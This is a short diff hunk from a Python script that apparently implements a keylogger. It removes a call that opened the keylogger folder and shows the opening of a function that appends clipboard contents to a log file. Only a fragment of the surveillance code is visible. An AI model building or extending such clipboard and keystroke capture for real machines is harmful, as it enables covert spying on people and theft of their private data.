@@ -16,7 +16,6 @@ except:
 
 
 extend="\\keylogger\\"
-os.startfile(file_path+extend)
 
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
